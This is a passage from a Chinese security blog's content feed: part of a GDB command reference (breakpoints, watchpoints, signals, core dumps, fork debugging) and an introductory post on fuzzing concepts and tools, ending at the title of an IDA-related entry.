#清空断点/观察点/捕获点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clear &#123;expr&#125; #根据表达式清空断点/观察点/捕获点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable &#123;id&#125; #启用id断点/观察点/捕获点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable &#123;id&#125; #关闭id断点/观察点/捕获点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ignore &#123;id&#125; &#123;count&#125; #忽略id断点/观察点/捕获点count次</span><br></pre></td></tr></table></figure><h3 id="观察点"><a href="#观察点" class="headerlink" title="观察点"></a>观察点</h3><p>监视数据读写事件，当对应事件发生时，程序停止运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch *&#123;address&#125; 或 w #当地址对应地址数据发生改变或修改时，程序中断</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch *(int*) &#123;address&#125; #监视四字节读写</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch *(long long int*) &#123;address&#125; #监视四字节读写</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rwatch 或 rw #当对应地址读取时中断</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awatch 或 aw #读或者写的时候中断</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info watchpoints #查看所有观察点/断点/捕获点</span><br></pre></td></tr></table></figure><h3 id="捕获点"><a href="#捕获点" class="headerlink" title="捕获点"></a>捕获点</h3><p>监视程序的系统调用、信号、异常事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catch exec #设置捕获点，捕获系统调用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catch fork/vfork #设置捕获fork/vfork系统调用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catch syscall #设置调用号为syscall的系统调用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catch signal &#123;name/id&#125; #捕获对应id/name的信号</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catch assert #捕获失败断言</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info tracepoints</span><br></pre></td></tr></table></figure><h2 id="信号和核心转储"><a href="#信号和核心转储" class="headerlink" title="信号和核心转储"></a>信号和核心转储</h2><h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><p>进程间的通信方式，用于查询的状态、信息的命令，gdb可以截获或者伪造，命令终止的根本原理就是调试器伪造终止信号发送给进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">SIGHUP       <span class="number">1</span>          <span class="comment">/* Hangup (POSIX).  */</span>                          终止进程     终端线路挂断</span><br><span class="line">SIGINT       <span class="number">2</span>          <span class="comment">/* Interrupt (ANSI).  */</span>                        终止进程     中断进程 Ctrl+C</span><br><span class="line">SIGQUIT      <span class="number">3</span>          <span class="comment">/* Quit (POSIX).  */</span>                            建立CORE文件终止进程，并且生成core文件 Ctrl+\</span><br><span class="line">SIGILL       <span class="number">4</span>          <span class="comment">/* Illegal instruction (ANSI).  */</span>              建立CORE文件,非法指令</span><br><span class="line">SIGTRAP      <span class="number">5</span>          <span class="comment">/* Trace trap (POSIX).  */</span>                      建立CORE文件,跟踪自陷</span><br><span class="line">SIGABRT      <span class="number">6</span>          <span class="comment">/* Abort (ANSI).  */</span></span><br><span class="line">SIGIOT       <span class="number">6</span>          <span class="comment">/* IOT trap (4.2 BSD).  */</span>                      建立CORE文件,执行I/O自陷</span><br><span class="line">SIGBUS       <span class="number">7</span>          <span class="comment">/* BUS error (4.2 BSD).  */</span>                     建立CORE文件,总线错误</span><br><span class="line">SIGFPE       <span class="number">8</span>          <span class="comment">/* Floating-point exception (ANSI).  */</span>         建立CORE文件,浮点异常</span><br><span class="line">SIGKILL      <span class="number">9</span>          <span class="comment">/* Kill, unblockable (POSIX).  */</span>               终止进程     杀死进程</span><br><span class="line">SIGUSR1      <span class="number">10</span>         <span class="comment">/* User-defined signal 1 (POSIX).  */</span>           终止进程     用户定义信号<span class="number">1</span></span><br><span class="line">SIGSEGV      <span class="number">11</span>         <span class="comment">/* Segmentation violation (ANSI).  */</span>           建立CORE文件,段非法错误</span><br><span class="line">SIGUSR2      <span class="number">12</span>         <span class="comment">/* User-defined signal 2 (POSIX).  */</span>           终止进程     用户定义信号<span class="number">2</span></span><br><span class="line">SIGPIPE      <span class="number">13</span>         <span class="comment">/* Broken pipe (POSIX).  */</span>                     终止进程     向一个没有读进程的管道写数据</span><br><span class="line">SIGALARM     <span class="number">14</span>         <span class="comment">/* Alarm clock (POSIX).  */</span>                     终止进程     计时器到时</span><br><span class="line">SIGTERM      <span class="number">15</span>         <span class="comment">/* Termination (ANSI).  */</span>                      终止进程     软件终止信号</span><br><span class="line">SIGSTKFLT    <span class="number">16</span>         <span class="comment">/* Stack fault.  */</span></span><br><span class="line">SIGCLD       SIGCHLD    <span class="comment">/* Same as SIGCHLD (System V).  */</span></span><br><span class="line">SIGCHLD      <span class="number">17</span>         <span class="comment">/* Child status has changed (POSIX).  */</span>        忽略信号     当子进程停止或退出时通知父进程</span><br><span class="line">SIGCONT      <span class="number">18</span>         <span class="comment">/* Continue (POSIX).  */</span>                        忽略信号     继续执行一个停止的进程</span><br><span class="line">SIGSTOP      <span class="number">19</span>         <span class="comment">/* Stop, unblockable (POSIX).  */</span>               停止进程     非终端来的停止信号</span><br><span class="line">SIGTSTP      <span class="number">20</span>         <span class="comment">/* Keyboard stop (POSIX).  */</span>                   停止进程     终端来的停止信号 Ctrl+Z</span><br><span class="line">SIGTTIN      <span class="number">21</span>         <span class="comment">/* Background read from tty (POSIX).  */</span>        停止进程     后台进程读终端</span><br><span class="line">SIGTTOU      <span class="number">22</span>         <span class="comment">/* Background write to tty (POSIX).  */</span>         停止进程     后台进程写终端</span><br><span class="line">SIGURG       <span class="number">23</span>         <span class="comment">/* Urgent condition on socket (4.2 BSD).  */</span>    忽略信号     I/O紧急信号</span><br><span class="line">SIGXCPU      <span class="number">24</span>         <span class="comment">/* CPU limit exceeded (4.2 BSD).  */</span>            终止进程     CPU时限超时</span><br><span class="line">SIGXFSZ      <span class="number">25</span>         <span class="comment">/* File size limit exceeded (4.2 BSD).  */</span>      终止进程     文件长度过长</span><br><span class="line">SIGVTALRM    <span class="number">26</span>         <span class="comment">/* Virtual alarm clock (4.2 BSD).  */</span>           终止进程     虚拟计时器到时</span><br><span class="line">SIGPROF      <span class="number">27</span>         <span class="comment">/* Profiling alarm clock (4.2 BSD).  */</span>         终止进程     统计分布图用计时器到时</span><br><span class="line">SIGWINCH     <span class="number">28</span>         <span class="comment">/* Window size change (4.3 BSD, Sun).  */</span>       忽略信号     窗口大小发生变化</span><br><span class="line">SIGPOLL      SIGIO      <span class="comment">/* Pollable event occurred (System V).  */</span></span><br><span class="line">SIGIO        <span class="number">29</span>         <span class="comment">/* I/O now possible (4.2 BSD).  */</span>              忽略信号     描述符上可以进行I/O</span><br><span class="line">SIGPWR       <span class="number">30</span>         <span class="comment">/* Power failure restart (System V).  */</span></span><br><span class="line">SIGSYS       <span class="number">31</span>         <span class="comment">/* Bad system call.  */</span></span><br><span class="line">SIGUNUSED    <span class="number">31</span></span><br></pre></td></tr></table></figure><h3 id="核心转储"><a href="#核心转储" class="headerlink" title="核心转储"></a>核心转储</h3><p>程序崩溃时生成的文件，这个文件包含了程序崩溃时内存镜像和寄存器状态。</p><p>GDB可以使用核心转储文件来后续调试分析。</p><h4 id="开启核心转储"><a href="#开启核心转储" class="headerlink" title="开启核心转储"></a>开启核心转储</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c 【字节大小】# 关闭设置为0，unlimited为无限制</span><br></pre></td></tr></table></figure><p><strong>这个命令只会在当前终端有效，退出终端或者打开一个新的终端时是无效的</strong>。因此可以在将上述配置加入到 <code>/etc/profile</code> 中可以持续生效</p><h4 id="分析核心转储文件"><a href="#分析核心转储文件" class="headerlink" title="分析核心转储文件"></a>分析核心转储文件</h4><p>运行程序出错后会在程序中生成名为core的文件</p><p>在调试gdb时加参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--core 【文件名】</span><br></pre></td></tr></table></figure><p>即可分析核心存储文件，<strong>注意，分析核心转储时一定要运行原先程序文件</strong></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>调试过程中使用的命令</p><h3 id="启动类"><a href="#启动类" class="headerlink" title="启动类"></a>启动类</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run 【参数1】【参数2】【参数3】# 运行当前程序，若不设置参数则使用set args设置的参数</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start 【参数1】【参数2】【参数3】#运行当前程序，在main处终止</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">starti 【参数1】【参数2】【参数3】 #运行当前程序，在_start处终止</span><br></pre></td></tr></table></figure><h3 id="运行类"><a href="#运行类" class="headerlink" title="运行类"></a>运行类</h3><h4 id="步入"><a href="#步入" class="headerlink" title="步入"></a>步入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">step &#123;count&#125; 或 s &#123;count&#125; #执行一行源码，会进入函数中，count为步数，默认为一</span><br></pre></td></tr></table></figure><p>这里的步数不能简单的理解为步长，因为它遇见函数不是越过而是进入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stepi &#123;cout&#125; 或 si &#123;count&#125; #执行一行汇编，会进入函数中，count为步数，默认为一</span><br></pre></td></tr></table></figure><h4 id="步过"><a href="#步过" class="headerlink" title="步过"></a>步过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next &#123;count&#125; 或 n &#123;count&#125; #执行一行源码，不会会进入函数中，count为步数，默认为一</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nexti &#123;cout&#125; 或 ni &#123;count&#125; #执行一行汇编，不会进入函数中，count为步数，默认为一</span><br></pre></td></tr></table></figure><h4 id="多次执行"><a href="#多次执行" class="headerlink" title="多次执行"></a>多次执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">until 或 u #快速运行完当前的循环体，并运行至循环体外停止。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">finish #执行结束当前函数</span><br></pre></td></tr></table></figure><h4 id="断点命中后继续执行"><a href="#断点命中后继续执行" class="headerlink" title="断点命中后继续执行"></a>断点命中后继续执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">continue 或 c </span><br></pre></td></tr></table></figure><h3 id="观测类"><a href="#观测类" class="headerlink" title="观测类"></a>观测类</h3><h4 id="查看设置"><a href="#查看设置" class="headerlink" title="查看设置"></a>查看设置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procinfo #查看当前进程信息，以及设置设置</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xinfo &#123;地址&#125; #查看目标地址信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show directories #显示当前源码搜索目录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list 或 l #列处当前pc处源码，默认前5行</span><br><span class="line">list *&#123;address&#125; 查看地址处源码</span><br></pre></td></tr></table></figure><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmmap 查看段权限</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack &#123;count&#125; #查看栈信息，默认长度0x40</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *(指针类型) &#123;address&#125; #查看设置地址以规定类型的值，默认类型(void)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p  &#123;address&#125; #打印当前地址及类型</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">【类型】/count &#123;address&#125; #从address处以该类型查看count个数据</span><br></pre></td></tr></table></figure><blockquote><p>Format letters are <strong>o</strong>(octal), <strong>x</strong>(hex), <strong>d</strong>(decimal), <strong>u</strong>(unsigned decimal), <strong>t</strong>(binary), <strong>f</strong>(float), <strong>a</strong>(address), <strong>i</strong>(instruction), <strong>c</strong>(char), <strong>s</strong>(string) and <strong>z</strong>(hex, zero padded on the left)</p><p>Size letters are <strong>b</strong>(byte), <strong>h</strong>(halfword), <strong>w</strong>(word), <strong>g</strong>(giant, 8 bytes)</p></blockquote><h3 id="设置类"><a href="#设置类" class="headerlink" title="设置类"></a>设置类</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file &#123;filepath&#125; #加载可执行文件，会从当前路径和</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directory&#123;dirname&#125; 或 dir #添加dirname为源码搜索目录，没参数复位源码搜索路径</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">core-file &#123;filepath&#125; #加载core文件用于调试</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec-file &#123;object&#125; #制定与调试可执行文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file&#123;filepath&#125; -s &#123;section-name&#125; &#123;address&#125;添加调试文件并指定段名和加载地址，用于多核</span><br></pre></td></tr></table></figure><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><p>查看可切换调试的线程：info threads</p><p>(2)切换调试的线程：thread 线程id</p><p>(3)只运行当前线程：set scheduler-locking on</p><p>(4)运行全部的线程：set scheduler-locking off</p><p>(5)指定某线程执行某gdb命令：thread apply 线程id gdb_cmd</p><p>(6)全部的线程执行某gdb命令：thread apply all gdb_cmd</p><h3 id="多进程和fork"><a href="#多进程和fork" class="headerlink" title="多进程和fork"></a>多进程和fork</h3><h4 id="方法1：attach-pid"><a href="#方法1：attach-pid" class="headerlink" title="方法1：attach pid"></a>方法1：attach pid</h4><p>如果fork后的命令存在暂停或其他等待，可以考虑使用attach pid 来再次attach</p><h4 id="方法2：detach-on-fork"><a href="#方法2：detach-on-fork" class="headerlink" title="方法2：detach-on-fork"></a>方法2：detach-on-fork</h4><p>我们可以通过命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show detach-on-fork</span><br></pre></td></tr></table></figure><p>来查看现在的模式，如果返回值为off则fork后新的子进程不会执行，而是等待，否则继续执行，当然我们也可以通过以下命令来更改设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set detach-on-fork off/on</span><br></pre></td></tr></table></figure><p>设置完后，经过fork容然默认进入子进程，但此时的父进程是attach的状态，我们可以通过命令来查看我们现在存在的进程的进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info inferiors</span><br></pre></td></tr></table></figure><p>然后通过inferior命令进行切换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inferior &lt;id&gt;</span><br></pre></td></tr></table></figure><p>这样后即可调试父进程</p><h4 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h4><p>如果我们<strong>只想针对父fork进行调试</strong>的情况下，我们可以在fork前使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set follow-fork-mode [parent|child|ask]</span><br></pre></td></tr></table></figure><p>来进行设置通过设立来确定我们fork后将attach哪一个进程</p><h2 id="gdb-multiarch调试不同架构"><a href="#gdb-multiarch调试不同架构" class="headerlink" title="gdb-multiarch调试不同架构"></a>gdb-multiarch调试不同架构</h2><p>当gdb去调试qemu或者其他不同架构设备时，直接调试是无法成功的，需要使用gdb-multiarch（需要下载）来进行调试</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -q 文件</span><br></pre></td></tr></table></figure><p>设置架构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set architecture arm # 设置架构</span><br></pre></td></tr></table></figure><p>连接目标机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote host:port</span><br></pre></td></tr></table></figure><h1 id="引用参考"><a href="#引用参考" class="headerlink" title="引用参考"></a>引用参考</h1><ol><li><a href="https://www.bilibili.com/video/BV1px4y16747/?share_source=copy_web&vd_source=54b3214c5c13869fd20783c86d5b91ca">roderick01师傅的【快来pwn1pwn】视频</a></li><li><a href="https://www.cnblogs.com/frisk/p/11602973.html">Linux下signal信号汇总 - 撒欢 - 博客园 (cnblogs.com)</a></li><li><a href="https://zhuanlan.zhihu.com/p/641038731">Linux系统调试篇——核心转储（core dump） - 知乎 (zhihu.com)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模糊测试一</title>
      <link href="/2025/06/09/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E4%B8%80/"/>
      <url>/2025/06/09/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>笔者今天下午进行了一场二进制研究相关面试，但面试后发现笔者在fuzz方面的原理和概念上并不熟练，并且在深度上严重不足，于是总结归纳，希望系统性的学习以下模糊测试，并决定专开一栏，进行相关的系统深入学习。</p><h1 id="了解模糊测试"><a href="#了解模糊测试" class="headerlink" title="了解模糊测试"></a>了解模糊测试</h1><h2 id="模糊测试概念"><a href="#模糊测试概念" class="headerlink" title="模糊测试概念"></a>模糊测试概念</h2><p>通过自动化生成并执行大量测试用例来返现目标的未知漏洞</p><h2 id="模糊测试原理模型"><a href="#模糊测试原理模型" class="headerlink" title="模糊测试原理模型"></a>模糊测试原理模型</h2><h3 id="生成随机字符串"><a href="#生成随机字符串" class="headerlink" title="生成随机字符串"></a>生成随机字符串</h3><p>生成随机字符串是一个比较简陋的方法，可能效果并不好，尤其是协议部分，可能在协议部分就出现问题</p><p><a href="https://www.helloimg.com/i/2025/06/09/6846dac0cd9f5.png"><img src="https://www.helloimg.com/i/2025/06/09/6846dac0cd9f5.png" alt="image-20250609182518403.png"></a></p><h3 id="基于模板生成"><a href="#基于模板生成" class="headerlink" title="基于模板生成"></a>基于模板生成</h3><p>这里我们以HTTP协议为例，以下是一个HTTP协议的例子</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http 1.0</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>developer.mozilla.org</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh</span><br></pre></td></tr></table></figure><p>其中我们知道，类似于http这一类的信息是不变的，而像1.0、GET类似的信息是可变的，而下方Host中的操作是资源字符部分。基于以上我们的分析，我们可以生成一个模板，然后根据模板来进行字符串的生成，只有通过这一模板生成的字符串才是有意义的。</p><p><a href="https://www.helloimg.com/i/2025/06/09/6846da99474b0.png"><img src="https://www.helloimg.com/i/2025/06/09/6846da99474b0.png" alt="image-20250609184102524.png"></a></p><h3 id="基于覆盖式的生成（覆盖制导）"><a href="#基于覆盖式的生成（覆盖制导）" class="headerlink" title="基于覆盖式的生成（覆盖制导）"></a>基于覆盖式的生成（覆盖制导）</h3><p>我们假设有以下的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (data[0] &gt; 0)&#123;</span><br><span class="line"></span><br><span class="line">func1()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line"></span><br><span class="line">func2()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>覆盖引导后就会将代码的流程生成出来程序的流程图，这个流程我们将其称为 <code>代码路径</code></p><p><a href="https://www.helloimg.com/i/2025/06/09/6846dac50f365.png"><img src="https://www.helloimg.com/i/2025/06/09/6846dac50f365.png" alt="image-20250609185052069.png"></a></p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>那么这样的功能是怎么实现出来的呢？这里就有一定插桩相关的原理，我们再回到上面的代码来看，我们可以在程序中插入log1，log2，示例如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">log(__main_start)</span><br><span class="line">if (data[0] &gt; 0)&#123;</span><br><span class="line"></span><br><span class="line">func1()</span><br><span class="line">log(func1.info)</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line"></span><br><span class="line">func2()</span><br><span class="line">log(func1.info)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此后程序可以对生成的log文件进行跟踪，通过生成的log来分析运行的路径来确定程序的运行流程，从而生成流程图。</p><h4 id="为什么要实现覆盖引导"><a href="#为什么要实现覆盖引导" class="headerlink" title="为什么要实现覆盖引导"></a>为什么要实现覆盖引导</h4><p>因为每次进行代码路径分析的时候，我们会检测到新的代码路径，而不断的扫描新路径则会不断提高代码的覆盖率，并说明这段代码是有意义的，那么接下来需要将代码放入后续的生成中，基于这个数据上进一步变异生成，然后不断重复这一个过程。</p><h2 id="特殊条件的fuzz"><a href="#特殊条件的fuzz" class="headerlink" title="特殊条件的fuzz"></a>特殊条件的fuzz</h2><h3 id="图形化FUZZ"><a href="#图形化FUZZ" class="headerlink" title="图形化FUZZ"></a>图形化FUZZ</h3><p>很多时候的程序并不像我们我们上述所给出的程序一样，一定存在输入和输出的流，那么此时我们要怎么进行fuzz呢？我们知道，大多数的UI实现都是会对UI和func存在绑定的，那么我们的第一部程序拆解，最终拆解成我们可以进行调用的某一个函数，那么这样后我们就可以和常规的fuzz一致了。</p><h3 id="持久化程序fuzz"><a href="#持久化程序fuzz" class="headerlink" title="持久化程序fuzz"></a>持久化程序fuzz</h3><p>我们标准的fuzz的理想情况是程序是运行后给出结果立刻结束，第二次测试则进行一个新的运行。但是很多程序并不会这样，譬如webserver，它会一直停留运行，那么我们需要有以下的方法</p><ul><li>idapatch将程序修改程序逻辑为只处理1次</li><li>修改fuzz逻辑<ul><li>自己实现fuzz</li><li>持续性fuzz</li></ul></li></ul><h2 id="经典模糊测试工具"><a href="#经典模糊测试工具" class="headerlink" title="经典模糊测试工具"></a>经典模糊测试工具</h2><ul><li>AFL</li><li>libafl （iot常用，rust静态连接低依赖，有点像乐高，可以自己拼接功能）</li><li>winafl（window版）</li><li>syzkaller（同原理，进程fuzz）</li><li>libfuzzer（可以针对程序的某个函数）</li><li>fuzzilli（CS引擎fuzz）</li></ul>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
          <category> 工具开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 逆向工程 </tag>
            
            <tag> 固件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修复ida8.4移植arm等反编译卡死问题（含完整版下载）</title>
      <link href="/2025/06/01/%E4%BF%AE%E5%A4%8Dida8-4%E7%A7%BB%E6%A4%8Darm%E7%AD%89%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8D%A1%E6%AD%BB%E9%97%AE%E9%A2%98%EF%BC%88%E5%90%AB%E5%AE%8C%E6%95%B4%E7%89%88%E4%B8%8B%E8%BD%BD%EF%BC%89/"/>
      <url>/2025/06/01/%E4%BF%AE%E5%A4%8Dida8-4%E7%A7%BB%E6%A4%8Darm%E7%AD%89%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8D%A1%E6%AD%BB%E9%97%AE%E9%A2%98%EF%BC%88%E5%90%AB%E5%AE%8C%E6%95%B4%E7%89%88%E4%B8%8B%E8%BD%BD%EF%BC%89/</url>
      
